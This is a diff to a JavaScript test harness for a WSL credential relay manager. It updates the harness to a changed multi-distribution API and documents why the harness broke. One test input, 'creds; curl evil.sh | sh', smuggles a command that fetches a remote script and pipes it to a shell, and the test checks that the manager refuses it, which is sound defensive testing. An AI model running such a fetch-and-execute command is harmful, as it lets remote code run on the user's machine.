@@ -281,21 +281,31 @@ async function main() {
   process.env.WSLENV = 'CREDS_RELAY_SOCKET';
   await wsl(`rm -f ${MANAGED_SOCKET}`);
 
+  // The manager grew multi-distribution support and `socketPath` became `socketPathFor(distro)`;
+  // this harness kept calling the old getter, which returned undefined and crashed on `.length`.
+  // The empty name is the default distribution, the same value passed to `start`.
+  const DEFAULT_DISTRO = '';
   const managerLog = [];
   const manager = new WslRelayManager(
     (args) => spawnWslRelay(args, (text) => managerLog.push(text)),
     (message) => managerLog.push(message),
   );
-  const startResult = manager.start(LINUX_CLI, '');
+  // `['']` is the DEFAULT distribution, not an empty list: `start` takes an array of distribution
+  // names and an empty name means "whatever wsl.exe would pick". This harness passed the bare
+  // string `''` until 2026-09-06, from back when `start` took one distro — and since nothing in CI
+  // runs this file, the crash it caused (`distros.find is not a function`) went unseen. That is the
+  // gap `research/module_tests.md` exists to close: an untyped `.cjs` harness can drift away from
+  // the API it drives with nothing to notice.
+  const startResult = manager.start(LINUX_CLI, ['']);
   check('the manager accepts a plain command', startResult.ok === true, JSON.stringify(startResult));
 
-  for (let attempt = 0; attempt < 40 && manager.socketPath.length === 0; attempt += 1) {
+  for (let attempt = 0; attempt < 40 && manager.socketPathFor(DEFAULT_DISTRO).length === 0; attempt += 1) {
     await new Promise((resolve) => setTimeout(resolve, 250));
   }
   check(
     'the manager learned the socket from the relay, not from a rule of its own',
-    manager.socketPath === MANAGED_SOCKET,
-    `${JSON.stringify(manager.socketPath)} — log: ${JSON.stringify(managerLog)}`,
+    manager.socketPathFor(DEFAULT_DISTRO) === MANAGED_SOCKET,
+    `${JSON.stringify(manager.socketPathFor(DEFAULT_DISTRO))} — log: ${JSON.stringify(managerLog)}`,
   );
   const alive = await wsl(`ps -eo args | grep "[c]reds relay" | head -1`);
   check('a real relay is running in the distribution', alive.stdout.trim().length > 0, alive.stdout.trim());
@@ -305,7 +315,7 @@ async function main() {
   const gone = await wsl(`ps -eo args | grep "[c]reds relay" | head -1`);
   check('disposing the manager takes it down — nothing outlives the window', gone.stdout.trim().length === 0, gone.stdout.trim());
 
-  const refused = manager.start('creds; curl evil.sh | sh', '');
+  const refused = manager.start('creds; curl evil.sh | sh', ['']);
   check('a command that is not a plain word never reaches a shell', refused.ok === false, JSON.stringify(refused));
 
   await wsl(`rm -f ${RELAY_SOCKET} ${MANAGED_SOCKET} /tmp/creds-itest.*`);
